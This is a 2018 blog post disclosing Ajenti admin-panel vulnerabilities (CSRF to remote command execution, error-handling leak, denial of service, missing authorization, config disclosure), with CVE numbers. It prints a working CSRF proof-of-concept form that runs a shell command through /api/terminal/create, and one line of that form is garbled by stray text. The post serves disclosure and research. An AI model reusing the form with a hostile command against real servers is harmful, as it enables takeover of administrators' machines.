=== Content from medium.com_397e5b34_20250125_000636.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fd2b7526eaeee&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2Fstolabs%2Fsecurity-issues-on-ajenti-d2b7526eaeee&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2Fstolabs%2Fsecurity-issues-on-ajenti-d2b7526eaeee&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Security Issues on Ajenti.

[![Edward Amaral Toledano](https://miro.medium.com/v2/resize:fill:88:88/1*Dhdd_VmRBD0Tc6YkcagqmA.jpeg)](/%40etoledano?source=post_page---byline--d2b7526eaeee--------------------------------)[![stolabs](https://miro.medium.com/v2/resize:fill:48:48/1*gTF5Rzr9-H4_L_Z4k1yjHg.png)](https://medium.com/stolabs?source=post_page---byline--d2b7526eaeee--------------------------------)

[Edward Amaral Toledano](/%40etoledano?source=post_page---byline--d2b7526eaeee--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fc3cf2c73fe69&operation=register&redirect=https%3A%2F%2Fmedium.com%2Fstolabs%2Fsecurity-issues-on-ajenti-d2b7526eaeee&user=Edward+Amaral+Toledano&userId=c3cf2c73fe69&source=post_page-c3cf2c73fe69--byline--d2b7526eaeee---------------------post_header-----------)

Published in[stolabs](https://medium.com/stolabs?source=post_page---byline--d2b7526eaeee--------------------------------)·3 min read·Jan 29, 2018

--

Listen

Share

## Researching the platform, me, Edward Amaral and my coworker Daniel Chactoura, security researchers from Stone Payments found some security issues on the Admin panel by Ajenti.

## Those Vulnerabilities were:

* **Multiple CSRF with Remote Code Execution**
* **Inproper Error Handling**
* **Denial of Service**
* **Security Misconfiguration**

# CSRF With RCE

The CSRF was the first thing that we were looking for in the platform. because in tools like that, authentication bypass and CRSFs are the vulnerabilities that has the higher level of severity.

Well, let’s explain what we’ve done.

The CSRF occoured in several requisitions, we will explain the https://<IP>/api/terminal/create path.

With this CSRF we can make the admin of the server execute any command we want.

We created the code below to make the PoC . It creates a directory named Test=CSRF\_PoC in the Desktop of the server.

> <html>
>
> <body>
>
> <script>history.pushState(‘’, ‘’, ‘/’)</script>
>
> <form action=”https://172.16.3.117:8000/api/terminal/create" method=”POST” enctype=”text/plain”>
>
> <inpAs being a admin onlyut type=”hidden” name=”&#123;&quot;command&quot;&#58;&quot;mkdir&#32;&#47;home&#47;edward&#47;Desktop&#47;Test” value=”CSRF\_POC&quot;&#44;&quot;autoclose&quot;&#58;&quot;true&quot;}” />
>
> <input type=”submit” value=”Submit request” />
>
> </form>
>
> </body>
>
> </html>

# **Improper Error Handling**

There’s a traceback error that occours when the request sends a malformed JSON as data to the login requisition. With that JSON the server responds with paths related to the server machine .

The JSON sent was {“username”:”User”,”password”:”P4ssw0rd”,”mode”:”normal”}**=**-

The equal sign that makes the JSON malformed, and forces the server to respond with an error message that show the path related to the tool on the server.

# Denial Of Service

This attack was found on the Get information requisition. We found that by changing the name of the sensor, the server responds with its name, and the string does not have any size control. When we saw that, the first thing that comes to mind is to Flood the server with a GIANT string, and that’s what we’ve done. The server frooze as it was expected.

# Security Misconfiguration

On the second day of testing we were testing the permissions of the tool, as it’s expected, the application has several features that are only useable if you have superuser privledges on the tool,

And we found that we can make the requisition of downloading the application plugins without being an admin of the server. That gains a lot of severity points because it can download a plugin that has a known vulnerability, to gain access to the server machine.

![]()

Requisition done as user, and it’s response

**Research Update.**

After further researching on the platform, me, Lucas Carmo, found another issue, that causes an information disclosure.

While conducting a vulnerability research on the application, i’ve started a code enumeration to understand how the application works. With this, I identified an information disclosure in the source code of the login page, that returns valuable information such as: operational system of the server, and the username of the Super user registered by the administrator of the server(super users are users that are allowed to use sudo command). Studying the application, i saw that this information comes from the /etc/ajenti/config.yml and this is imported by the angularJS on source code.

The source Code:

> <script>
>  angular.module(‘core’).constant(‘urlPrefix’, ‘’);
>  angular.module(‘core’).constant(‘ajentiPlugins’, {“core”: “Core”, “ace”: “Ace editor”, “settings”: “Settings”, “passwd”: “User DB API”, “notepad”: “Notepad”, “plugins”: “Plugins”, “filemanager”: “File Manager”, “terminal”: “Terminal”, “dashboard”: “Dashboard”, “filesystem”: “Filesystem API”, “services”: “Services”, “packages”: “Packages”});
>  angular.module(‘core’).constant(‘initialConfigContent’, {“ssl”: {“client\_auth”: {“certificates”: [], “enable”: false, “force”: false}, “enable”: false, “certificate”: null}, “max\_sessions”: 9, “name”: “ubuntu”, “language”: “en”, “color”: “default”, “bind”: {“host”: “0.0.0.0”, “mode”: “tcp”, “port”: 8000}, “auth”: {“allow\_sudo”: true, “emails”: {}, “provider”: “os”}, “restricted\_user”: “root”});
>  angular.module(‘core’).constant(‘ajentiPlatform’, ‘debian’);
>  angular.module(‘core’).constant(‘ajentiPlatformUnmapped’, ‘ubuntu’);
>  angular.module(‘core’).constant(‘ajentiVersion’, ‘2.1.24’);
>  angular.module(‘core’).constant(‘ajentiBootstrapColor’, ‘default’);
>
> angular.element(document).ready(ajentiBootstrap);
> </script>

![]()

Source code showing private information

CVES related to that issues:

* CVE-2018–1000080
* CVE-2018–1000081
* CVE-2018–1000082
* CVE-2018–1000083
* CVE-2018–1000126
[JavaScript](/tag/javascript?source=post_page-----d2b7526eaeee--------------------------------)[Csrf](/tag/csrf?source=post_page-----d2b7526eaeee--------------------------------)[Vulnerability](/tag/vulnerability?source=post_page-----d2b7526eaeee--------------------------------)[Security](/tag/security?source=post_page-----d2b7526eaeee--------------------------------)[Research](/tag/research?source=post_page-----d2b7526eaeee--------------------------------)

--

--

[![stolabs](https://miro.medium.com/v2/resize:fill:96:96/1*gTF5Rzr9-H4_L_Z4k1yjHg.png)](https://medium.com/stolabs?source=post_page---post_publication_info--d2b7526eaeee--------------------------------)[![stolabs](https://miro.medium.com/v2/resize:fill:128:128/1*gTF5Rzr9-H4_L_Z4k1yjHg.png)](https://medium.com/stolabs?source=post_page---post_publication_info--d2b7526eaeee--------------------------------)[## Published in stolabs](https://medium.com/stolabs?source=post_page---post_publication_info--d2b7526eaeee--------------------------------)[135 Followers](/stolabs/followers?source=post_page---post_publication_info--d2b7526eaeee--------------------------------)·[Last published Jan 6, 2023](/stolabs/how-saml-works-and-some-attacks-on-it-2f62db0ef1d9?source=post_page---post_publication_info--d2b7526eaeee--------------------------------)

STO Labs

[![Edward Amaral Toledano](https://miro.medium.com/v2/resize:fill:96:96/1*Dhdd_VmRBD0Tc6YkcagqmA.jpeg)](/%40etoledano?source=post_page---post_author_info--d2b7526eaeee--------------------------------)[![Edward Amaral Toledano](https://miro.medium.com/v2/resize:fill:128:128/1*Dhdd_VmRBD0Tc6YkcagqmA.jpeg)](/%40etoledano?source=post_page---post_author_info--d2b7526eaeee--------------------------------)Follow[## Written by Edward Amaral Toledano](/%40etoledano?source=post_page---post_author_info--d2b7526eaeee--------------------------------)[23 Followers](/%40etoledano/followers?source=post_page---post_author_info--d2b7526eaeee--------------------------------)·[10 Following](/%40etoledano/following?source=post_page---post_author_info--d2b7526eaeee--------------------------------)

Security researcher at STOlabs

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----d2b7526eaeee--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----d2b7526eaeee--------------------------------)[About](/about?autoplay=1&source=post_page-----d2b7526eaeee--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----d2b7526eaeee--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----d2b7526eaeee--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----d2b7526eaeee--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----d2b7526eaeee--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----d2b7526eaeee--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----d2b7526eaeee--------------------------------)[Teams](/business?source=post_page-----d2b7526eaeee--------------------------------)


